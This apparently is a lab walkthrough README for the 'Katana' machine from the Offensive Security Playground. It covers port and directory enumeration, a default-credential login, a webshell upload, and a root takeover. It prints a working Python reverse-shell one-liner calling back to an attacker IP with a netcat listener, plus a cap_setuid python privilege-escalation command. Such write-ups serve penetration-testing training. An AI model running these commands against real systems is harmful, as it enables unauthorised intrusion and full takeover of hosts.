@@ -1,0 +1,181 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 192.168.122.83<br/>
+<br/>
+Enumeration (nmap,gobuster,dirsearch)<br/>
+Webshell upload<br/>
+Priv Escalation (Capabilities) /usr/bin/python2.7 = cap_setuid+ep<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Katana]<br/>
+└─# nmap -sC -sV 192.168.122.83 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 04:50 +0630<br/>
+Nmap scan report for 192.168.122.83<br/>
+Host is up (0.21s latency).<br/>
+Not shown: 65529 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE &nbsp;VERSION<br/>
+21/tcp &nbsp; open &nbsp;ftp &nbsp; &nbsp; &nbsp;vsftpd 3.0.3<br/>
+22/tcp &nbsp; open &nbsp;ssh &nbsp; &nbsp; &nbsp;OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 894f3a5401f8dcb66ee078fc60a6de35 (RSA)<br/>
+| &nbsp; 256 ddaccc4e43816be32df312a13e4ba322 (ECDSA)<br/>
+|_ &nbsp;256 cce625c0c6119f88f6c4261edefae98b (ED25519)<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp; Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Katana X<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+7080/tcp open &nbsp;ssl/http LiteSpeed httpd<br/>
+|_http-title: Katana X<br/>
+|_http-server-header: LiteSpeed<br/>
+|_ssl-date: TLS randomness does not represent time<br/>
+| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US<br/>
+| Not valid before: 2020-05-11T13:57:36<br/>
+|_Not valid after: &nbsp;2022-05-11T13:57:36<br/>
+| tls-alpn: <br/>
+| &nbsp; h2<br/>
+| &nbsp; spdy/3<br/>
+| &nbsp; spdy/2<br/>
+|_ &nbsp;http/1.1<br/>
+8088/tcp open &nbsp;http &nbsp; &nbsp; LiteSpeed httpd<br/>
+|_http-title: Katana X<br/>
+|_http-server-header: LiteSpeed<br/>
+8715/tcp open &nbsp;http &nbsp; &nbsp; nginx 1.14.2<br/>
+| http-auth: <br/>
+| HTTP/1.1 401 Unauthorized\x0D<br/>
+|_ &nbsp;Basic realm=Restricted Content<br/>
+|_http-title: 401 Authorization Required<br/>
+|_http-server-header: nginx/1.14.2<br/>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 428.24 seconds<br/>
+<br/>
+I found 4 web service is running in this machine<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Gobuster Result (Port 80)<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# gobuster dir --url http://192.168.122.83/ -w ~/Desktop/wordlists_Seclist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,ssh,js,css -t 30<br/>
+===============================================================<br/>
+Gobuster v3.3<br/>
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>
+===============================================================<br/>
+[+] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; http://192.168.122.83/<br/>
+[+] Method: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;GET<br/>
+[+] Threads: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30<br/>
+[+] Wordlist: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/root/Desktop/wordlists_Seclist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt<br/>
+[+] Negative Status codes: &nbsp; 404<br/>
+[+] User Agent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;gobuster/3.3<br/>
+[+] Extensions: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;php,html,txt,ssh,js,css<br/>
+[+] Timeout: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10s<br/>
+===============================================================<br/>
+2023/03/10 04:57:41 Starting gobuster in directory enumeration mode<br/>
+===============================================================<br/>
+/.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 279]<br/>
+/index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 655]<br/>
+/.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 403) [Size: 279]<br/>
+/ebook &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 316] [--&gt; http://192.168.122.83/ebook/]<br/>
+<br/>
+I found "CSE Bookstore" service and I login with common credential admin:admin and then I got login as admin but I tried to upload in this web server but it didn't work.<br/>
+<br/>
+So, I check Another web service.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Dirsearch Result (port 8088)<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://192.168.122.83:8088/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2<br/>
+&nbsp;(_||| _) (/_(_|| (_| )<br/>
+<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/192.168.122.83-8088/-_23-03-10_04-52-25.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-03-10_04-52-25.log<br/>
+<br/>
+Target: http://192.168.122.83:8088/<br/>
+<br/>
+[04:52:26] Starting: <br/>
+[04:53:12] 301 - &nbsp; &nbsp;1KB - /cgi-bin &nbsp;-&gt; &nbsp;http://192.168.122.83:8088/cgi-bin/ <br/>
+[04:53:16] 301 - &nbsp; &nbsp;1KB - /css &nbsp;-&gt; &nbsp;http://192.168.122.83:8088/css/ &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[04:53:19] 301 - &nbsp; &nbsp;1KB - /docs &nbsp;-&gt; &nbsp;http://192.168.122.83:8088/docs/ &nbsp; &nbsp; &nbsp; <br/>
+[04:53:19] 200 - &nbsp; &nbsp;5KB - /docs/<br/>
+[04:53:28] 301 - &nbsp; &nbsp;1KB - /img &nbsp;-&gt; &nbsp;http://192.168.122.83:8088/img/ &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[04:53:28] 200 - &nbsp;655B &nbsp;- /index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[04:53:44] 200 - &nbsp; 50KB - /phpinfo.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[04:53:48] 401 - &nbsp; &nbsp;1KB - /protected/data/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[04:53:48] 401 - &nbsp; &nbsp;1KB - /protected/runtime/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[04:54:01] 200 - &nbsp; &nbsp;2KB - /upload.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[04:54:01] 200 - &nbsp; &nbsp;6KB - /upload.html<br/>
+<br/>
+Found Suspicous file upload directory so I tried upload web shell again from this web service and then successfully uploaded my webshell but not in this web service and it moved into another web service so I check another web service from another port. Guess what I found my webshell from this web service (port 8715):<br/>
+<br/>
+File Uploaded Successfully Message From Port 8088<br/>
+<br/>
+Please wait for 1 minute!. Please relax!.<br/>
+<br/>
+File : file1<br/>
+Name : __welcome.php<br/>
+Type : application/x-php<br/>
+Path : /tmp/phpVGxgW0<br/>
+Size : 179123<br/>
+Please wait for 1 minute!. Please relax!.<br/>
+<br/>
+Moved to other web server: /tmp/phpVGxgW0 ====&gt; /opt/manager/html/katana___welcome.php<br/>
+MD5 : 2f1c426b9c3e4b01427bdc69262ee8de<br/>
+Size : 179123 bytes<br/>
+<br/>
+<br/>
+webshell directory - http://192.168.122.83:8715/katana___welcome.php<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse Shell with Python (https://www.revshells.com/)<br/>
+<br/>
+payload - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.122",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+listening on [any] 4444 ...<br/>
+connect to [192.168.49.122] from (UNKNOWN) [192.168.122.83] 33692<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation (/usr/bin/python2.7 = cap_setuid+ep) Capabilities<br/>
+<br/>
+After running linpeas, I found /usr/bin/python2.7 = cap_setuid+ep capabilities is vulnerable for priv escalation this machine so I reserached and found exploit command from hacktricks:<br/>
+<br/>
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example<br/>
+<br/>
+<br/>
+Simply run below command and then got root:<br/>
+<br/>
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'<br/>
+<br/>
+root@katana:/tmp# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+<br/>
+<br/>
+root@katana:/root# cat proof.txt <br/>
+4952d4980dc4734b6a883337d3a06aea<br/>
+<br/>
+www-data@katana:/opt/manager/html$ cat /var/www/local.txt<br/>
+3b5e2b4cfcd152d72c1dd8d5106d9f4d</body></html>
